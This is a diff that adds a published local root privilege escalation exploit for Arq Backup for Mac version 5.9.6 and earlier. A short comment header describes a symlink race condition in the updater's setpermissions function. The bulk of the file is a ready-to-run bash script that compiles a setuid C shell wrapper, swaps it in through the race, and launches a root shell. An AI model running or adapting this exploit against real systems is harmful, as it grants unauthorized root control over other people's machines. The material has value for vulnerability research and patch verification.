@@ -1,0 +1,78 @@
+# Arq Backup from Haystack Software is a great application for backing up macs and
+# windows machines. Unfortunately versions of Arq for mac before 5.9.7 are
+# vulnerable to a local root privilege escalation exploit.
+
+# The updater binary has a "setpermissions" function which sets the suid bit and
+# root ownership on itself but it suffers from a race condition that allows you to
+# swap the destination for these privileges using a symlink.
+
+# We can exploit this to get +s and root ownership on any arbitrary binary.
+
+# Other binaries in the application also suffer from the same issue.
+
+# This was fixed in Arq 5.9.7.
+
+# https://m4.rkw.io/arq_5.9.6.sh.txt
+# 49cc82df33a3e23245c7a1659cc74c0e554d5fdbe2547ac14e838338e823956d
+# ------------------------------------------------------------------------------
+#!/bin/bash
+
+##################################################################
+###### Arq <= 5.9.6 local root privilege escalation exploit ######
+###### by m4rkw - https://m4.rkw.io/blog.html                 ####
+##################################################################
+
+vuln=`ls -la /Applications/Arq.app/Contents/Library/LoginItems/\
+Arq\ Agent.app/Contents/Resources/arq_updater |grep 'rwsr-xr-x' \
+|grep root`
+
+cwd="`pwd`"
+
+if [ "$vuln" == "" ] ; then
+  echo "Not vulnerable - auto-updates not enabled."
+  exit 1
+fi
+
+cat > arq_596_exp.c <<EOF
+#include <unistd.h>
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl(
+    "/bin/bash","bash","-c","rm -f $cwd/arq_updater;/bin/bash",
+    NULL
+  );
+  return 0;
+}
+EOF
+
+gcc -o arq_596_exp arq_596_exp.c
+rm -f arq_596_exp.c
+
+ln -s /Applications/Arq.app/Contents/Library/LoginItems/\
+Arq\ Agent.app/Contents/Resources/arq_updater
+
+./arq_updater setpermissions &>/dev/null&
+rm -f ./arq_updater
+mv arq_596_exp ./arq_updater
+
+i=0
+timeout=10
+
+while :
+do
+  r=`ls -la ./arq_updater |grep root`
+  if [ "$r" != "" ] ; then
+    break
+  fi
+  sleep 0.1
+  i=$((i+1))
+  if [ $i -eq $timeout ] ; then
+    rm -f ./arq_updater
+    echo "Not vulnerable"
+    exit 1
+  fi
+done
+
+./arq_updater
